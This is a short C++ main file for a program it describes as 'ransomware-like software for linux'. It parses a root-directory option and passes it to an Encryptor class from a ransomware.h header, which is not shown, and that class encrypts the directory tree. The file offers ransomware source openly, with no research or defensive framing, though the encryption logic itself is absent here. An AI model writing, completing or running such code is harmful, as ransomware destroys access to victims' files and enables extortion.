#include <string>
#include <iostream>
#include <cstdlib>

#include <cxxopts.hpp>
#include <fmt/format.h>

#include <ransomware.h>

int main(int const argc, char const *const argv[])
{
    auto options = cxxopts::Options("ransomware", "Custom ransomware-like software for linux");
    options.add_options()
        ("r,root", "root directory for encryption", cxxopts::value<std::string>())
        ("h,help", "print usage");
    auto result = options.parse(argc, argv);

    if (result.count("help") != 0) {
        std::cout << options.help() << std::endl;
        std::exit(EXIT_SUCCESS);
    }

    auto const rootPath = result["root"].as<std::string>();
    std::cout << fmt::format("Root directory for encryption: {}\n", rootPath) << std::flush;

    try {
        auto encryptor = Encryptor(rootPath);
        encryptor.Encrypt();
    } catch (std::exception &e) {
        std::cerr << fmt::format("Encryption failed with an exception: {}\n", e.what());
    }

    return 0;
}
